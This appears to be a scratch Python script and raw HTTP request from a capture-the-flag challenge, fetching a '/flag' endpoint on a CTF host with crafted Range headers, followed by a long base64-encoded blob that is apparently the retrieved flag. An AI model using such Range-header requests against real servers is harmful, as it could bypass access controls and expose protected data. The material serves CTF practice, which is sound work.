import requests


INCREMENTAL = 100
CURRENT_DOWN = 0
CURRENT_UP = 1900

s = requests.Session()

CURRENT_DOWN = 0
CURRENT_UP = 1
# while True:

header = {
    "Host": "blackhat4-d16b7acaff378c4e81294f56fe7f5b74-0.chals.bh.ctf.sa",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "X-Requested-With": "XMLHttpRequest",
    "Referer": "https://blackhat4-d16b7acaff378c4e81294f56fe7f5b74-0.chals.bh.ctf.sa/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Te": "trailers",
    "Connection": "close",
    "Range": f"bytes={CURRENT_DOWN}-{CURRENT_UP}",
}

# CURRENT_DOWN += INCREMENTAL
# CURRENT_UP += INCREMENTAL

submit = s.get("https://blackhat4-d16b7acaff378c4e81294f56fe7f5b74-0.chals.bh.ctf.sa/flag")

print(submit.headers)
print(submit.text)

GET /flag HTTP/1.1
Host: blackhat4-d16b7acaff378c4e81294f56fe7f5b74-0.chals.bh.ctf.sa
User-Agent: curl/7.81.0
Accept: */*
Range: bytes=1500-1920
Range: bytes=1000-1500
Range: bytes=720-1000

Vm0wd2QyUXlVWGxXYTFwUFZsZG9WRmx0ZUV0WFJteFZVbTVrVlUxV2NIcFdNalZyVm14S2MyTkljRmhoTVhCUVZtcEdTMlJIVmtWUmJIQk9UVEJLU1ZadGNFZFpWMDE1VTJ0V1ZXSklRbGhXYlhoM1ZWWmtWMXBFVWxwV01ERTBWa2MxVDFkSFNrZGpSVGxhVmpOU1IxcFZXbUZrUlRGVlZXeFNUbUpGY0VwV2JURXdZVEpHVjFOWVpGaGlSa3BZV1d4b2IwMHhiSEZTYlhSWVVqRktTVnBGV2xOVWJGcFlaSHBDVjFaRmEzaFZha1phWlZaT2NtSkdTbWhsYlhoWVYxZDRVMVl4U2tkaVNFWlRZbFZhY1ZsclpEQk9iR3hXVjJzNVZXSkZjRWhXTVdoclZqRmFSbUl6WkZkaGExcFlXa1ZhVDJOc2NFaGpSbEpUVmxoQ1dWWXhaRFJpTVZWM1RVaG9WMkpyTlZsWmJGWmhZMVphZEdONlJsaGlSM2hYVmpKek5WWlhTbFpYVkVwV1lrWktSRlpxU2tkamJVbzJVV3hrYUdFeGNGaFhiRnBoVkRKT2RGSnJhR2hTYkVwVVZteG9RMWRXV1hoYVJGSnBUVlpXTTFSVmFHOVdNa3B5VGxac1dtSkhhRlJXTUZwVFZqRmtkRkp0ZUZkaVZrbzFWakowVTFFeFdsaFRiRnBxVWxkU1lWUlZXbUZsYkZweFVWaG9hMVpzV2pCWlZWcDNZa2RGZWxGcmJGZGlXRUpJVmtSS1RtVkdaSFZWYld4VFlYcFdlbGRYZUc5aU1rbDRWMjVTVGxaRlNsaFVWbFY0VGtaa2NsWnRkRmRpVlhCNVdUQmFjMWR0U2tkWGJXaFhZVEZ3VkZacVJuZFNNVkp5VGxaT2FXRXdjRWxXYlhCS1pEQTFXRkpyWkZSWFIyaFpXVzAxUTFkR1VsaE9WemxyWWtad2VGVnRkREJWTWtwSVZXcENXbFpXY0ROWlZXUkdaVWRPU1dKR1pGZE5NRXBKVjFaU1MxUXlUWGhqUld4VllrWndjRlpxVG05WFZscDBUVVJHVWsxWFVucFdNV2h2VjBkS1JrNVdVbFZXYlZFd1ZqRmFWMlJIVWtoa1IyaHBVbGhDV1ZkVVFtRmpNV1IwVWxob1YxZEhhR0ZVVmxwM1ZrWmFjVk5yWkZOaVJrcDZWbGQ0VDJGV1duSmlla1pYWVd0dmQxbHFSbEpsUm1SWldrVTFWMkpXU25oV1YzaHJZakZaZUZWc1pGaGhNMUpWVlcxNGQyVkdWWGxrUjBacFVteHdlbFV5Tlc5V01WbDZZVVJPV2xaWFVrZGFWV1JQVWpGV2MyRkhiRk5pYTBwMlZteG9kMU14VlhoWFdHaFdZbXhhVmxsc1ZtRldSbEpZVFZjNWEySkhVbnBYYTFKVFYyeGFkRlZyYUZkTmFsWk1WakJrUzFOR1ZuUlNiR1JwVjBVME1GWkhlR0ZaVms1SVZtdG9hMUp0VW5CV2JHaERUbFprVlZGdFJtbE5WbXd6VkZaV2IxWnRTbk5qUm1oWFlrWndNMXBYZUhKbFYxWklaRWR3YVZacmNFaFdSM2hoVkRKR1YxcEZaRk5oYkhCWVdXeFNSazFHV2xWU2EzQnNVbTFTTVZVeWN6RldNVnB6WTBaV1dGWXpVbkpaYWtaelZqRmtXVnBIYUZOV1ZGWldWbGN4TkdRd01VZGpSbHBoVWxkU1YxUlhkSGRXTVZKelZtNWtWMkpWY0ZwWlZWcHZWakZKZW1GSGFHRlNiSEJJV1RKNFlXTXhjRWhpUms1T1ZsWlplbFp0ZUdGVk1VbDRZa1prV0dKcmNFOVdiWGgzVjBac1dXTkdaRmRTYkZwNVZtMTBZVlF4VmxWTlJHczk=

